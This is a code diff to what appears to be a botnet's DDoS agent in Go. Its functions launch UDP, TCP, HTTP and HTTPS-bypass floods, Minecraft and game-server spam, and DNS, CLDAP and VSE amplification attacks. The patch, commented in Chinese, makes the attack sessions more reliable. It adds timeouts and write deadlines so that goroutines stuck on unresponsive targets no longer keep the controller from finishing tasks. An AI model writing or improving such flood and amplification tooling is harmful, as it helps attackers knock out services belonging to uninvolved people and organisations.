@@ -347,6 +347,22 @@ func (s *AttackSession) abort() {
 	close(s.DoneChan)
 }
 
+// waitGroupTimeout 等待 WaitGroup 完成，但最多等待 timeout：
+// 个别攻击 goroutine 卡死（如目标不消费数据的 TCP Write）时，
+// 不能让 wg.Wait() 永久阻塞——否则 DoneChan 永不关闭，
+// 任务到时不结束、Controller 超时后重复派发攻击。
+func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) {
+	done := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(timeout):
+	}
+}
+
 func (s *AttackSession) Stop() {
 	s.finish()
 	// 等待攻击 goroutine 退出，但最多 5 秒：
@@ -829,7 +845,7 @@ func StartVSEAttackEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		s.Snapshot()
 		close(s.DoneChan)
 	}()
@@ -1085,7 +1101,7 @@ func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1168,6 +1184,10 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 								return
 							default:
 							}
+							// WriteDeadline 必须设置：目标不消费数据时
+							// Write 可能永久阻塞，卡死整个攻击 goroutine，
+							// 导致任务到时不结束、Controller 超时重试
+							conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
 							_, err := conn.Write(payload)
 							if err != nil {
 								atomic.AddUint64(&s.Stats.Errors, 1)
@@ -1191,7 +1211,10 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		// 等待攻击 goroutine 退出，但最多 5 秒：
+		// 个别 goroutine 卡死（如系统调用异常）时不能阻塞任务完成上报，
+		// 否则 DoneChan 永不关闭 → Controller 判定任务超时并重试攻击
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1269,7 +1292,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1358,7 +1381,7 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1460,7 +1483,7 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1546,6 +1569,8 @@ func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
 						pkt = prebuiltLogin
 					}
 
+					// WriteDeadline：防止目标不消费数据时 Write 永久阻塞
+					conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
 					conn.Write(pkt)
 					atomic.AddUint64(&s.Stats.PacketsSent, 1)
 					atomic.AddUint64(&s.Stats.BytesSent, uint64(len(pkt)))
@@ -1560,7 +1585,7 @@ func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -1768,7 +1793,7 @@ func StartVSEAmplificationEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -2456,7 +2481,7 @@ func StartCLDAPAmplificationEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
@@ -2611,7 +2636,7 @@ func StartDNSAmplificationEx(cfg AttackConfig) *AttackSession {
 		case <-s.StopChan:
 		}
 		s.finish()
-		wg.Wait()
+		waitGroupTimeout(&wg, 5*time.Second)
 		close(s.DoneChan)
 	}()
 
